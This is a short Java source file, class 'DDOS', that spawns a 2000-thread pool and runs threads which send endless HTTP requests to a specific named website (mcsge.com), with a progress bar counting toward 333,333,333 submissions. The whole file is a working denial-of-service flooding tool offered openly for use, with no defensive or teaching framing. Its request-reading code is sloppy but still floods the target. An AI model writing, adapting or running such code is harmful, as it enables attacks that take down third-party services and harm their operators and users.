package org.example;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDOS {

    static int Complete = 333333333;
    static int i = 0;

    public static void main(String[] args) throws InterruptedException {
        ExecutorService es = Executors.newFixedThreadPool(2000);
        Mythread mythread = new Mythread();
        Thread thread = new Thread(mythread);
        for (i = 0; i < Complete; i++) {
            es.execute(thread);
            System.out.println("\r" + Progress_Bar.Main(Complete, i, 0));
        }
    }

    public static class Mythread implements Runnable {
        public void run() {
            while (true) {
                try {
                    URL url = new URL("https://mcsge.com/");
                    URLConnection conn = url.openConnection();
                    BufferedInputStream bis = new BufferedInputStream(
                            conn.getInputStream());
                    byte[] bytes = new byte[1024];
                    int len = -1;
                    StringBuffer sb = new StringBuffer();
                    if (bis != null) {
                        if ((len = bis.read()) != -1) {
                            sb.append(new String(bytes, 0, len));
                            bis.close();
                        }
                    }
                } catch (MalformedURLException e) {

                    e.printStackTrace();
                } catch (IOException e) {

                    e.printStackTrace();
                }

            }
        }
    }


    }

